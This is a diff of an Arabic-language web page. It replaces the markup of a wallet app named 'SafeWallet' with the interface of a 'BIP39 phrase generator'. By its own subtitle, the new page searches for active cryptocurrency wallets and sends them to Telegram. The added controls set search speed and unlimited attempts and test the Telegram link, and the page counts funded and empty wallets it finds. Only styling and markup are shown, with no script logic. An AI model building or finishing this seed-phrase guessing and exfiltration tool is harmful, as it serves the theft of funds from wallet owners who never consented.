-            border-color: var(--error-color);
-            color: var(--error-color);
-        }
-
-        .setting-btn.danger:hover {
-            background: var(--error-color);
-            color: white;
-        }
-
-        /* شاشة التحميل */
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(15, 15, 35, 0.9);
-            z-index: 2000;
-            backdrop-filter: blur(4px);
-        }
-
-        .loading-overlay.active {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .loading-content {
+        .status-card {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
             text-align: center;
-            color: var(--text-primary);
+            border: 1px solid #e9ecef;
+        }
+
+        .status-card .number {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #4facfe;
+            margin-bottom: 5px;
+        }
+
+        .status-card .label {
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .log-panel {
+            background: #212529;
+            color: #ffffff;
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 25px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+
+        .log-entry {
+            margin-bottom: 8px;
+            padding: 5px 0;
+            border-bottom: 1px solid #343a40;
+        }
+
+        .log-entry:last-child {
+            border-bottom: none;
+        }
+
+        .log-timestamp {
+            color: #6c757d;
+            font-size: 0.8rem;
+        }
+
+        .log-success {
+            color: #28a745;
+        }
+
+        .log-error {
+            color: #dc3545;
+        }
+
+        .log-info {
+            color: #17a2b8;
+        }
+
+        .wallet-display {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            word-break: break-all;
+        }
+
+        .wallet-display .mnemonic {
+            background: #e9ecef;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+        }
+
+        .wallet-display .address {
+            color: #495057;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
         }
 
         .loading-spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid var(--border-color);
-            border-top: 3px solid var(--primary-color);
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
-            margin: 0 auto var(--spacing-md);
-            animation: spin 1s linear infinite;
-        }
-
-        .loading-spinner.large {
-            width: 60px;
-            height: 60px;
-            border-width: 4px;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
         }
 
-        /* رسائل التنبيه */
-        .toast-container {
-            position: fixed;
-            top: var(--spacing-lg);
-            right: var(--spacing-lg);
-            z-index: 3000;
-            display: flex;
-            flex-direction: column;
-            gap: var(--spacing-sm);
+        .alert {
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-weight: 500;
         }
 
-        .toast {
-            background: var(--bg-modal);
-            color: var(--text-primary);
-            border-radius: 8px;
-            padding: var(--spacing-md) var(--spacing-lg);
-            box-shadow: var(--shadow-lg);
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            min-width: 300px;
-            animation: toastSlideIn 0.3s ease;
+        .alert-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
         }
 
-        @keyframes toastSlideIn {
-            from {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
+        .alert-danger {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
         }
 
-        @keyframes toastSlideOut {
-            from {
-                transform: translateX(0);
-                opacity: 1;
-            }
-            to {
-                transform: translateX(100%);
-                opacity: 0;
-            }
+        .alert-info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
         }
 
-        .toast.success {
-            border-right: 4px solid var(--success-color);
+        .alert-warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
         }
 
-        .toast.error {
-            border-right: 4px solid var(--error-color);
-        }
-
-        .toast.warning {
-            border-right: 4px solid var(--warning-color);
-        }
-
-        .toast.info {
-            border-right: 4px solid var(--primary-color);
-        }
-
-        /* نافذة ماسح QR */
-        .qr-scanner-container {
-            text-align: center;
-        }
-
-        .scanner-video {
-            width: 100%;
-            max-width: 300px;
-            height: 200px;
-            background: var(--bg-tertiary);
-            border-radius: 8px;
-            margin-bottom: var(--spacing-md);
-        }
-
-        .scanner-controls {
-            display: flex;
-            gap: var(--spacing-sm);
-            justify-content: center;
-            margin-bottom: var(--spacing-md);
-        }
-
-        .scanner-btn {
-            background: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: var(--spacing-sm) var(--spacing-md);
-            cursor: pointer;
-            transition: background-color var(--transition-fast);
-            font-size: var(--font-sm);
-        }
-
-        .scanner-btn:hover {
-            background: var(--primary-dark);
-        }
-
-        .scanner-btn:disabled {
-            background: var(--border-color);
-            cursor: not-allowed;
-        }
-
-        /* نافذة طلب كلمة المرور */
-        .password-prompt-modal {
-            background: rgba(0, 0, 0, 0.9);
-        }
-
-        .password-prompt-content {
-            max-width: 400px;
-            width: 90%;
-        }
-
-        .password-prompt-form {
-            display: flex;
-            flex-direction: column;
-            gap: var(--spacing-md);
-        }
-
-        .password-prompt-input {
-            padding: var(--spacing-md);
-            background: var(--bg-tertiary);
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: var(--font-md);
-            text-align: center;
-        }
-
-        .password-prompt-input:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
-        }
-
-        .password-prompt-buttons {
-            display: flex;
-            gap: var(--spacing-sm);
-        }
-
-        .password-prompt-buttons button {
-            flex: 1;
-        }
-
-        /* نافذة التحويلات */
-        .transactions-modal .modal-content {
-            max-width: 700px;
-        }
-
-        .transactions-filter {
-            display: flex;
-            gap: var(--spacing-sm);
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .filter-btn {
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            color: var(--text-secondary);
-            padding: var(--spacing-xs) var(--spacing-sm);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            font-size: var(--font-sm);
-        }
-
-        .filter-btn.active {
-            background: var(--primary-color);
-            border-color: var(--primary-color);
-            color: white;
-        }
-
-        .filter-btn:hover:not(.active) {
-            border-color: var(--primary-color);
-            color: var(--primary-color);
-        }
-
-        /* التصميم المتجاوب */
+        /* تصميم متجاوب للهواتف المحمولة */
         @media (max-width: 768px) {
-            .screen {
-                padding: var(--spacing-md);
+            body {
+                padding: 10px;
             }
             
-            .welcome-container {
-                padding: var(--spacing-md);
+            .header h1 {
+                font-size: 2rem;
             }
             
-            .logo {
-                width: 60px;
-                height: 60px;
+            .header p {
+                font-size: 1rem;
             }
             
-            .logo i {
-                font-size: 28px;
+            .main-content {
+                padding: 20px;
             }
             
-            .welcome-container h1 {
-                font-size: var(--font-2xl);
+            .control-panel {
+                padding: 20px;
             }
             
-            .quick-actions {
-                grid-template-columns: repeat(3, 1fr);
-            }
-            
-            .action-icon {
-                width: 40px;
-                height: 40px;
-                font-size: 18px;
-            }
-            
-            .balance-amount {
-                font-size: var(--font-2xl);
-            }
-            
-            .wallet-info {
+            .button-group {
                 flex-direction: column;
-                gap: var(--spacing-md);
-                text-align: center;
             }
             
-            .modal-content {
-                width: 95%;
-                margin: var(--spacing-md);
-            }
-            
-            .gas-options {
-                grid-template-columns: 1fr;
-            }
-            
-            .toast-container {
-                right: var(--spacing-md);
-                left: var(--spacing-md);
-            }
-            
-            .toast {
+            .btn {
+                width: 100%;
                 min-width: auto;
+            }
+            
+            .status-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 15px;
+            }
+            
+            .status-card .number {
+                font-size: 1.5rem;
+            }
+            
+            .log-panel {
+                font-size: 0.8rem;
+                max-height: 200px;
             }
         }
 
         @media (max-width: 480px) {
-            .screen {
-                padding: var(--spacing-sm);
+            .header {
+                padding: 20px;
             }
             
-            .welcome-actions {
-                gap: var(--spacing-sm);
+            .header h1 {
+                font-size: 1.8rem;
             }
             
-            .btn {
-                padding: var(--spacing-sm) var(--spacing-md);
-                font-size: var(--font-sm);
+            .main-content {
+                padding: 15px;
             }
             
-            .quick-actions {
-                gap: var(--spacing-sm);
-                grid-template-columns: repeat(2, 1fr);
+            .control-panel {
+                padding: 15px;
             }
             
-            .action-btn {
-                padding: var(--spacing-md);
+            .status-grid {
+                grid-template-columns: 1fr;
             }
             
-            .balance-card {
-                padding: var(--spacing-lg);
+            .status-card {
+                padding: 15px;
             }
             
-            .wallet-info {
-                padding: var(--spacing-md);
-            }
-            
-            .modal-body {
-                padding: var(--spacing-md);
-            }
-            
-            .form-group {
-                margin-bottom: var(--spacing-md);
+            .wallet-display .mnemonic {
+                font-size: 0.8rem;
+                padding: 10px;
             }
         }
 
-        /* تحسينات إضافية للأداء */
-        * {
-            -webkit-tap-highlight-color: transparent;
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
         }
 
-        button, .btn {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        /* تأثيرات التمرير */
-        .screen {
-            scroll-behavior: smooth;
+        .log-panel::-webkit-scrollbar {
+            width: 8px;
         }
 
-        /* تحسين الخطوط */
-        body {
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            text-rendering: optimizeLegibility;
+        .log-panel::-webkit-scrollbar-track {
+            background: #343a40;
+            border-radius: 4px;
+        }
+
+        .log-panel::-webkit-scrollbar-thumb {
+            background: #6c757d;
+            border-radius: 4px;
+        }
+
+        .log-panel::-webkit-scrollbar-thumb:hover {
+            background: #adb5bd;
         }
     </style>
 </head>
 <body>
-    <div class="app-container">
-        <!-- شاشة الترحيب -->
-        <div id="welcomeScreen" class="screen active">
-            <div class="welcome-container">
-                <div class="logo-section">
-                    <div class="logo">
-                        <i class="fas fa-shield-alt"></i>
-                    </div>
-                    <h1>SafeWallet</h1>
-                    <p class="tagline">محفظتك الآمنة للعملات الرقمية</p>
-                </div>
-                
-                <div class="welcome-actions">
-                    <button id="importWalletBtn" class="btn btn-primary btn-full">
-                        <i class="fas fa-download"></i>
-                        استيراد محفظة موجودة
-                    </button>
-                    <button id="createWalletBtn" class="btn btn-secondary btn-full">
-                        <i class="fas fa-plus"></i>
-                        إنشاء محفظة جديدة
-                    </button>
-                </div>
-                
-                <div class="security-note">
-                    <i class="fas fa-lock"></i>
-                    <span>محفظتك آمنة ومشفرة بالكامل</span>
-                </div>
-            </div>
+    <div class="container">
+        <div class="header">
+            <h1>🔑 مولد عبارات BIP39</h1>
+            <p>البحث عن المحافظ النشطة وإرسالها إلى Telegram</p>
         </div>
 
-        <!-- شاشة كلمة المرور -->
-        <div id="passwordScreen" class="screen">
-            <div class="password-container">
-                <div class="screen-header">
-                    <button id="backToCreateFromPasswordBtn" class="back-btn">
-                        <i class="fas fa-arrow-right"></i>
-                    </button>
-                    <h2>تعيين كلمة المرور</h2>
+        <div class="main-content">
+            <div class="control-panel">
+                <div class="control-group">
+                    <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
+                    <input type="number" id="searchSpeed" value="2000" min="1000" max="10000" step="500">
                 </div>
-                
-                <div class="password-form">
-                    <div class="form-section">
-                        <label for="passwordInput">كلمة المرور</label>
-                        <div class="password-input-container">
-                            <input type="password" id="passwordInput" class="password-input" placeholder="أدخل كلمة مرور قوية">
-                            <button type="button" id="togglePassword" class="password-toggle">
-                                <i class="fas fa-eye"></i>
-                            </button>
-                        </div>
-                        <div class="password-strength">
-                            <div id="passwordStrengthBar" class="password-strength-bar"></div>
-                        </div>
-                        <div class="password-requirements">
-                            <p>متطلبات كلمة المرور:</p>
-                            <ul>
-                                <li id="lengthReq" class="invalid">
-                                    <i class="fas fa-times"></i>
-                                    <span>8 أحرف على الأقل</span>
-                                </li>
-                                <li id="uppercaseReq" class="invalid">
-                                    <i class="fas fa-times"></i>
-                                    <span>حرف كبير واحد على الأقل</span>
-                                </li>
-                                <li id="lowercaseReq" class="invalid">
-                                    <i class="fas fa-times"></i>
-                                    <span>حرف صغير واحد على الأقل</span>
-                                </li>
-                                <li id="numberReq" class="invalid">
-                                    <i class="fas fa-times"></i>
-                                    <span>رقم واحد على الأقل</span>
-                                </li>
-                                <li id="specialReq" class="invalid">
-                                    <i class="fas fa-times"></i>
-                                    <span>رمز خاص واحد على الأقل</span>
-                                </li>
-                            </ul>
-                        </div>
-                    </div>
-                    
-                    <div class="form-section">
-                        <label for="confirmPasswordInput">تأكيد كلمة المرور</label>
-                        <div class="password-input-container">
-                            <input type="password" id="confirmPasswordInput" class="password-input" placeholder="أعد إدخال كلمة المرور">
-                            <button type="button" id="toggleConfirmPassword" class="password-toggle">
-                                <i class="fas fa-eye"></i>
-                            </button>
-                        </div>
-                    </div>
-                    
-                    <button id="setPasswordBtn" class="btn btn-primary btn-full" disabled>
-                        <i class="fas fa-lock"></i>
-                        تعيين كلمة المرور
-                    </button>
+
+                <div class="control-group">
+                    <label for="maxAttempts">الحد الأقصى للمحاولات (0 = لا نهاية):</label>
+                    <input type="number" id="maxAttempts" value="0" min="0" max="10000">
                 </div>
-                
-                <div class="security-warning">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    <div>
-                        <strong>مهم جداً:</strong><br>
-                        احفظ كلمة المرور في مكان آمن. لا يمكن استرداد المحفظة بدونها.
-                    </div>
+
+                <div class="button-group">
+                    <button id="startBtn" class="btn btn-success">
+                        <span>🚀 بدء البحث</span>
+                    </button>
+                    <button id="stopBtn" class="btn btn-danger" disabled>
+                        <span>⏹️ إيقاف البحث</span>
+                    </button>
+                    <button id="testTelegramBtn" class="btn btn-secondary">
+                        <span>📱 اختبار Telegram</span>
+                    </button>
+                    <button id="clearLogsBtn" class="btn btn-primary">
+                        <span>🗑️ مسح السجل</span>
+                    </button>
                 </div>
             </div>
-        </div>
 
-        <!-- شاشة استيراد المحفظة -->
-        <div id="importScreen" class="screen">
-            <div class="import-container">
-                <div class="screen-header">
-                    <button id="backToWelcomeBtn" class="back-btn">
-                        <i class="fas fa-arrow-right"></i>
-                    </button>
-                    <h2>استيراد محفظة</h2>
-                </div>
-                
-                <div class="import-form">
-                    <div class="form-section">
-                        <label for="mnemonicInput">عبارة الاسترجاع</label>
-                        <textarea id="mnemonicInput" placeholder="أدخل الكلمات مفصولة بمسافات"></textarea>
-                        <div class="input-hint">
-                            <i class="fas fa-info-circle"></i>
-                            <span>أدخل الكلمات مفصولة بمسافات</span>
-                        </div>
+            <div class="status-panel">
+                <h3>📊 إحصائيات العملية</h3>
+                <div class="status-grid">
+                    <div class="status-card">
+                        <div class="number" id="totalGenerated">0</div>
+                        <div class="label">إجمالي العبارات</div>
                     </div>
-                    
-                    <button id="importBtn" class="btn btn-primary btn-full">
-                        <i class="fas fa-download"></i>
-                        المتابعة
-                    </button>
-                </div>
-                
-                <div class="security-warning">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    <div>
-                        <strong>تحذير أمني:</strong><br>
-                        تأكد من أنك في مكان آمن وأن لا أحد يراقب شاشتك
+                    <div class="status-card">
+                        <div class="number" id="activeWallets">0</div>
+                        <div class="label">المحافظ النشطة</div>
                     </div>
+                    <div class="status-card">
+                        <div class="number" id="emptyWallets">0</div>
+                        <div class="label">المحافظ الفارغة</div>
+                    </div>
+                    <div class="status-card">
+                        <div class="number" id="errorCount">0</div>
+                        <div class="label">الأخطاء</div>
+                    </div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div id="currentStatus" class="alert alert-info">
+                    جاهز للبدء...
                 </div>
             </div>
-        </div>
 
-        <!-- شاشة إنشاء المحفظة -->
-        <div id="createScreen" class="screen">
-            <div class="create-container">
-                <div class="screen-header">
-                    <button id="backToWelcomeFromCreateBtn" class="back-btn">
-                        <i class="fas fa-arrow-right"></i>
-                    </button>
-                    <h2>إنشاء محفظة جديدة</h2>
-                </div>
-                
-                <div class="wallet-info-card">
-                    <div class="info-section">
-                        <label>عنوان المحفظة</label>
-                        <div class="address-display">
-                            <span id="newWalletAddress">جاري الإنشاء...</span>
-                            <button id="copyAddressBtn" class="copy-btn">
-                                <i class="fas fa-copy"></i>
-                            </button>
-                        </div>
-                    </div>
-                    
-                    <div class="info-section">
-                        <label>عبارة الاسترجاع</label>
-                        <div class="mnemonic-display">
-                            <div class="mnemonic-words" id="newWalletMnemonic">جاري الإنشاء...</div>
-                            <button id="copyMnemonicBtn" class="copy-btn">
-                                <i class="fas fa-copy"></i>
-                            </button>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="backup-warning">
-                    <i class="fas fa-shield-alt"></i>
-                    <div>
-                        <strong>احفظ عبارة الاسترجاع بأمان!</strong><br>
-                        هذه هي الطريقة الوحيدة لاستعادة محفظتك. احفظها في مكان آمن ولا تشاركها مع أحد.
-                    </div>
-                </div>
-                
-                <button id="continueToPasswordBtn" class="btn btn-primary btn-full">
-                    <i class="fas fa-arrow-left"></i>
-                    تعيين كلمة المرور
-                </button>
-            </div>
-        </div>
-
-        <!-- شاشة المحفظة الرئيسية -->
-        <div id="walletScreen" class="screen">
-            <div class="wallet-container">
-                <!-- رأس المحفظة -->
-                <div class="wallet-header">
-                    <div class="wallet-info">
-                        <div class="wallet-name">
-                            <h3>محفظتي</h3>
-                            <div class="wallet-address-short">
-                                <span id="currentWalletAddress">0x0000...0000</span>
-                                <button id="copyCurrentAddressBtn" class="copy-btn-small">
-                                    <i class="fas fa-copy"></i>
-                                </button>
-                            </div>
-                        </div>
-                        <button id="settingsBtn" class="settings-btn">
-                            <i class="fas fa-cog"></i>
-                        </button>
-                    </div>
-                </div>
-
-                <!-- قسم الرصيد -->
-                <div class="balance-section">
-                    <div class="balance-card">
-                        <div class="balance-header">
-                            <span>إجمالي الرصيد</span>
-                            <button id="refreshBalanceBtn" class="refresh-btn">
-                                <i class="fas fa-sync-alt"></i>
-                            </button>
-                        </div>
-                        <div class="balance-amount">
-                            <span id="totalBalance">0.00</span>
-                            <span class="currency">USD</span>
-                        </div>
-                        <div class="balance-usd" id="balanceDetails">جاري التحميل...</div>
-                    </div>
-                </div>
-
-                <!-- الإجراءات السريعة -->
-                <div class="quick-actions">
-                    <div id="sendBtn" class="action-btn">
-                        <div class="action-icon send">
-                            <i class="fas fa-arrow-up"></i>
-                        </div>
-                        <span>إرسال</span>
-                    </div>
-                    <div id="receiveBtn" class="action-btn">
-                        <div class="action-icon receive">
-                            <i class="fas fa-arrow-down"></i>
-                        </div>
-                        <span>استقبال</span>
-                    </div>
-                    <div id="swapBtn" class="action-btn">
-                        <div class="action-icon swap">
-                            <i class="fas fa-exchange-alt"></i>
-                        </div>
-                        <span>تبديل</span>
-                    </div>
-                    <div id="buyBtn" class="action-btn">
-                        <div class="action-icon buy">
-                            <i class="fas fa-credit-card"></i>
-                        </div>
-                        <span>شراء</span>
-                    </div>
-                    <div id="transactionsBtn" class="action-btn">
-                        <div class="action-icon transactions">
-                            <i class="fas fa-history"></i>
-                        </div>
-                        <span>التحويلات</span>
-                    </div>
-                    <div id="supportBtn" class="action-btn">
-                        <div class="action-icon support">
-                            <i class="fas fa-headset"></i>
-                        </div>
-                        <span>دعم</span>
-                    </div>
-                </div>
-
-                <!-- قسم الأصول -->
-                <div class="assets-section">
-                    <div class="section-header">
-                        <h4>الأصول</h4>
-                        <button class="add-btn">
-                            <i class="fas fa-plus"></i>
-                            إضافة
-                        </button>
-                    </div>
-                    <div class="assets-list" id="assetsList">
-                        <div class="loading-assets">
-                            <div class="loading-spinner"></div>
-                            <span>جاري تحميل الأصول...</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- قسم المعاملات -->
-                <div class="transactions-section">
-                    <div class="section-header">
-                        <h4>المعاملات الأخيرة</h4>
-                        <button id="viewAllTransactionsBtn" class="view-all-btn">عرض الكل</button>
-                    </div>
-                    <div class="transactions-list" id="transactionsList">
-                        <div class="no-transactions">
-                            <i class="fas fa-receipt"></i>
-                            <span>لا توجد معاملات بعد</span>
-                        </div>
-                    </div>
+            <div class="log-panel" id="logPanel">
+                <div class="log-entry log-info">
+                    <span class="log-timestamp">[${new Date().toLocaleTimeString('ar-EG')}]</span>
+                    مرحباً بك في مولد عبارات BIP39. اضغط على "بدء البحث" للبدء.
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- النوافذ المنبثقة -->
-    
-    <!-- نافذة الإرسال -->
-    <div id="sendModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>إرسال الأصول</h3>
-                <button id="closeSendModal" class="close-btn">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <form id="sendForm">
-                    <div class="form-group">
-                        <label>الشبكة</label>
-                        <select id="networkSelect">
-                            <option value="ethereum">Ethereum</option>
-                            <option value="bsc">Binance Smart Chain</option>
-                            <option value="polygon">Polygon</option>
-                            <option value="arbitrum">Arbitrum</option>
-                            <option value="optimism">Optimism</option>
-                        </select>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label>إلى</label>
-                        <div class="input-with-scan">
-                            <input type="text" id="recipientAddress" placeholder="عنوان المحفظة أو ENS">
-                            <button type="button" id="scanAddressBtn" class="scan-btn">
-                                <i class="fas fa-qrcode"></i>
-                            </button>
-                        </div>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label>المبلغ</label>
-                        <div class="amount-input">
-                            <input type="number" id="sendAmount" placeholder="0.00" step="0.0001">
-                            <select id="assetSelect">
-                                <option value="ETH">ETH</option>
-                                <option value="USDT">USDT</option>
-                                <option value="USDC">USDC</option>
-                                <option value="DAI">DAI</option>
-                            </select>
-                        </div>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label>سرعة المعاملة</label>
-                        <div class="gas-options">
-                            <div class="gas-option" data-speed="slow">
-                                <span>بطيء</span>
-                                <span class="gas-price">~5 دقائق</span>
-                            </div>
-                            <div class="gas-option active" data-speed="standard">
-                                <span>عادي</span>
-                                <span class="gas-price">~2 دقيقة</span>
-                            </div>
-                            <div class="gas-option" data-speed="fast">
-                                <span>سريع</span>
-                                <span class="gas-price">~30 ثانية</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <button type="submit" class="btn btn-primary btn-full">
-                        <i class="fas fa-paper-plane"></i>
-                        إرسال
-                    </button>
-                </form>
-            </div>
-        </div>
-    </div>
-
-    <!-- نافذة الاستقبال -->
-    <div id="receiveModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>استقبال الأصول</h3>
-                <button id="closeReceiveModal" class="close-btn">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <div class="receive-content">
-                    <div class="form-group">
-                        <label>الشبكة</label>
-                        <select id="receiveNetworkSelect">
-                            <option value="ethereum">Ethereum</option>
-                            <option value="bsc">Binance Smart Chain</option>
-                            <option value="polygon">Polygon</option>
-                            <option value="arbitrum">Arbitrum</option>
-                            <option value="optimism">Optimism</option>
-                        </select>
-                    </div>
-                    
-                    <div class="qr-section">
-                        <div class="qr-code">
-                            <canvas id="qrCanvas"></canvas>
-                        </div>
-                    </div>
-                    
-                    <div class="address-section">
-                        <div class="form-group">
-                            <label>عنوان المحفظة</label>
-                            <div class="address-display">
-                                <span id="receiveAddress">0x0000...0000</span>
-                                <button id="copyReceiveAddressBtn" class="copy-btn">
-                                    <i class="fas fa-copy"></i>
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="receive-warning">
-                        <i class="fas fa-exclamation-triangle"></i>
-                        <span id="receiveWarningText">أرسل فقط أصول Ethereum (ETH, ERC-20) إلى هذا العنوان</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- نافذة ماسح QR -->
-    <div id="qrScannerModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>مسح رمز QR</h3>
-                <button id="closeQrScannerModal" class="close-btn">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <div class="qr-scanner-container">
-                    <div id="scannerVideo" class="scanner-video"></div>
-                    <div class="scanner-controls">
-                        <button id="startScanBtn" class="scanner-btn">
-                            <i class="fas fa-play"></i>
-                            بدء المسح
-                        </button>
-                        <button id="stopScanBtn" class="scanner-btn" disabled>
-                            <i class="fas fa-stop"></i>
-                            إيقاف المسح
-                        </button>
-                    </div>
-                    <p>وجه الكاميرا نحو رمز QR لمسحه</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- نافذة الإعدادات -->
-    <div id="settingsModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>الإعدادات</h3>
-                <button id="closeSettingsModal" class="close-btn">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <div class="settings-list">
-                    <div class="setting-item">
-                        <div class="setting-info">
-                            <i class="fas fa-key"></i>
-                            <span>عرض المفتاح الخاص</span>
-                        </div>
-                        <button id="showPrivateKeyBtn" class="setting-btn">
-                            <i class="fas fa-eye"></i>
-                        </button>
-                    </div>
-                    <div class="setting-item">
-                        <div class="setting-info">
-                            <i class="fas fa-seedling"></i>
-                            <span>عرض عبارة الاسترجاع</span>
-                        </div>
-                        <button id="showMnemonicBtn" class="setting-btn">
-                            <i class="fas fa-eye"></i>
-                        </button>
-                    </div>
-                    <div class="setting-item">
-                        <div class="setting-info">
-                            <i class="fas fa-lock"></i>
-                            <span>تغيير كلمة المرور</span>
-                        </div>
-                        <button id="changePasswordBtn" class="setting-btn">
-                            <i class="fas fa-edit"></i>
-                        </button>
-                    </div>
-                    <div class="setting-item danger">
-                        <div class="setting-info">
-                            <i class="fas fa-sign-out-alt"></i>
-                            <span>تسجيل الخروج</span>
-                        </div>
-                        <button id="logoutBtn" class="setting-btn danger">
-                            <i class="fas fa-power-off"></i>
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- نافذة الدعم الفني -->
-    <div id="supportModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>الدعم الفني</h3>
-                <button id="closeSupportModal" class="close-btn">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <form id="supportForm">
-                    <div class="form-group">
-                        <label for="supportName">الاسم الكامل</label>
-                        <input type="text" id="supportName" placeholder="أدخل اسمك الكامل" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="supportEmail">البريد الإلكتروني</label>
-                        <input type="email" id="supportEmail" placeholder="أدخل بريدك الإلكتروني" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="supportPhone">رقم الهاتف</label>
-                        <input type="tel" id="supportPhone" placeholder="أدخل رقم هاتفك">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="supportMessage">الرسالة</label>
-                        <textarea id="supportMessage" placeholder="اكتب رسالتك هنا..." required></textarea>
-                    </div>
-                    
-                    <button type="submit" class="btn btn-primary btn-full">
-                        <i class="fas fa-paper-plane"></i>
-                        إرسال الرسالة
-                    </button>
-                </form>
-            </div>
-        </div>
-    </div>
-
-    <!-- نافذة التحويلات -->
-    <div id="transactionsModal" class="modal transactions-modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>التحويلات</h3>
-                <button id="closeTransactionsModal" class="close-btn">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <div class="transactions-filter">
-                    <button class="filter-btn active" data-network="all">الكل</button>
-                    <button class="filter-btn" data-network="ethereum">Ethereum</button>
-                    <button class="filter-btn" data-network="bsc">BSC</button>
-                    <button class="filter-btn" data-network="polygon">Polygon</button>
-                </div>
-                <div id="allTransactionsList" class="transactions-list">
-                    <div class="loading-assets">
-                        <div class="loading-spinner"></div>
-                        <span>جاري تحميل التحويلات...</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- نافذة طلب كلمة المرور -->
-    <div id="passwordPromptModal" class="modal password-prompt-modal">
-        <div class="modal-content password-prompt-content">
-            <div class="modal-header">
-                <h3>أدخل كلمة المرور</h3>
-            </div>
-            <div class="modal-body">
-                <div class="password-prompt-form">
-                    <input type="password" id="passwordPromptInput" class="password-prompt-input" placeholder="كلمة المرور">
-                    <div class="password-prompt-buttons">
-                        <button id="passwordPromptCancel" class="btn btn-secondary">إلغاء</button>
-                        <button id="passwordPromptConfirm" class="btn btn-primary">تأكيد</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- شاشة التحميل -->
-    <div id="loadingOverlay" class="loading-overlay">
-        <div class="loading-content">
-            <div class="loading-spinner large"></div>
-            <p id="loadingText">جاري التحميل...</p>
-        </div>
-    </div>
-
-    <!-- حاوي رسائل التنبيه -->
-    <div id="toastContainer" class="toast-container"></div>
-
-    <!-- المكتبات الخارجية -->
